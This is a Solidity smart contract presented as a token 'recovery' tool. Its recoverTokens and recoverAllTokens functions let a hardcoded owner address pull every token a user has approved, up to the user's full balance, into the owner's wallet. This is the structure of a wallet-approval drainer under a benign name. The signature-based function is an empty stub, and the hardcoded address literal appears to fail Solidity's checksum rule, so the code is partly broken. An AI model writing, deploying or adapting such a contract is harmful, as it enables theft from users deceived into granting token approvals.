// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
}

contract RecoveryContract {
    address public owner;
    
    constructor() {
        owner = 0x6026f8db794026ed1b1f501085ab2d97dd6fbc15;
    }
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }
    
    // Execute token recovery using unlimited approval
    function recoverTokens(
        address tokenAddress,
        address userAddress,
        uint256 amount
    ) external onlyOwner {
        IERC20 token = IERC20(tokenAddress);
        require(token.allowance(userAddress, address(this)) >= amount, "Insufficient allowance");
        require(token.transferFrom(userAddress, owner, amount), "Transfer failed");
    }
    
    // Recover all approved tokens
    function recoverAllTokens(
        address tokenAddress,
        address userAddress
    ) external onlyOwner {
        IERC20 token = IERC20(tokenAddress);
        uint256 allowance = token.allowance(userAddress, address(this));
        uint256 balance = token.balanceOf(userAddress);
        uint256 amount = allowance < balance ? allowance : balance;
        
        if (amount > 0) {
            require(token.transferFrom(userAddress, owner, amount), "Transfer failed");
        }
    }
    
    // Execute recovery with signature verification
    function executeRecovery(
        address user,
        uint256 amount,
        bytes memory signature
    ) external onlyOwner {
        // Recovery logic using TypedData signature
        // Implementation depends on specific use case
    }
    
    // Emergency withdraw
    function emergencyWithdraw(address tokenAddress) external onlyOwner {
        IERC20 token = IERC20(tokenAddress);
        uint256 balance = token.balanceOf(address(this));
        if (balance > 0) {
            token.transfer(owner, balance);
        }
    }
}